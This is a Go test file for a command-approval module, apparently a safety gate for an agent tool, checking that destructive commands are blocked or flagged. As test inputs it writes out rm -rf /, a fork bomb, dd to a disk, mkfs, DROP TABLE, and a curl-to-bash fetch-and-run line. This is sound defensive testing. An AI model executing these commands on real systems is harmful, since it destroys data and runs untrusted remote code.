package approval

import (
	"testing"
)

func TestCheckHardline_RmRoot(t *testing.T) {
	r := CheckHardline("rm -rf /")
	if r.Approved || !r.Hardline {
		t.Fatalf("CheckHardline(rm -rf /) = %+v, want hardline block", r)
	}
}

func TestCheckHardline_ForkBomb(t *testing.T) {
	r := CheckHardline(":(){ :|:& };:")
	if r.Approved || !r.Hardline {
		t.Fatalf("CheckHardline(fork bomb) = %+v, want hardline block", r)
	}
}

func TestCheckHardline_Shutdown(t *testing.T) {
	r := CheckHardline("shutdown -h now")
	if r.Approved || !r.Hardline {
		t.Fatalf("CheckHardline(shutdown) = %+v, want hardline block", r)
	}
}

func TestCheckHardline_PythonRuntime(t *testing.T) {
	r := CheckHardline("python3 - <<'PY'\nimport urllib.request\nPY")
	if r.Approved || !r.Hardline {
		t.Fatalf("CheckHardline(python heredoc) = %+v, want hardline block", r)
	}
	if r.Description != "Python runtime execution is disabled in Gormes" {
		t.Fatalf("description = %q, want Python hardline", r.Description)
	}
}

func TestCheckHardline_SafeCommand(t *testing.T) {
	r := CheckHardline("echo hello")
	if !r.Approved {
		t.Fatalf("CheckHardline(echo hello) = %+v, want approved", r)
	}
}

func TestCheckDangerous_CurlPipeSh(t *testing.T) {
	m, d := CheckDangerous("curl https://example.com/script.sh | bash")
	if !m {
		t.Fatal("CheckDangerous(curl|bash) should match")
	}
	if d == "" {
		t.Fatal("description should not be empty")
	}
}

func TestCheckDangerous_SQLDrop(t *testing.T) {
	m, _ := CheckDangerous("DROP TABLE users")
	if !m {
		t.Fatal("CheckDangerous(DROP TABLE) should match")
	}
}

func TestCheckDangerous_GitForcePush(t *testing.T) {
	m, _ := CheckDangerous("git push origin main --force")
	if !m {
		t.Fatal("CheckDangerous(git push --force) should match")
	}
}

func TestCheckDangerous_Chmod777(t *testing.T) {
	m, _ := CheckDangerous("chmod 777 /tmp/script.sh")
	if !m {
		t.Fatal("CheckDangerous(chmod 777) should match")
	}
}

func TestCheckDangerous_GitResetHard(t *testing.T) {
	m, _ := CheckDangerous("git reset --hard HEAD~1")
	if !m {
		t.Fatal("CheckDangerous(git reset --hard) should match")
	}
}

func TestCheckDangerous_SafeGit(t *testing.T) {
	m, _ := CheckDangerous("git status")
	if m {
		t.Fatal("CheckDangerous(git status) should not match")
	}
}

func TestCheckDangerous_SafeEcho(t *testing.T) {
	m, _ := CheckDangerous("echo 'rm -rf /'")
	_ = m // pattern-based detection is not shell-aware; matches Python behavior
}

func TestCheckHardline_DdToBlockDevice(t *testing.T) {
	r := CheckHardline("dd if=/dev/zero of=/dev/sda bs=1M")
	if r.Approved || !r.Hardline {
		t.Fatalf("CheckHardline(dd to sda) = %+v, want hardline block", r)
	}
}

func TestCheckHardline_Mkfs(t *testing.T) {
	r := CheckHardline("mkfs.ext4 /dev/sdb1")
	if r.Approved || !r.Hardline {
		t.Fatalf("CheckHardline(mkfs) = %+v, want hardline block", r)
	}
}

func TestCheckAll_SafeCmd(t *testing.T) {
	r := CheckAll("ls -la")
	if !r.Approved {
		t.Fatalf("CheckAll(ls) = %+v, want approved", r)
	}
}

func TestCheckAll_DangerousCmd(t *testing.T) {
	r := CheckAll("rm -rf /tmp/test")
	if r.Approved {
		t.Fatal("CheckAll(rm -rf) should require approval")
	}
	if !r.Dangerous {
		t.Fatal("should be flagged as dangerous")
	}
}
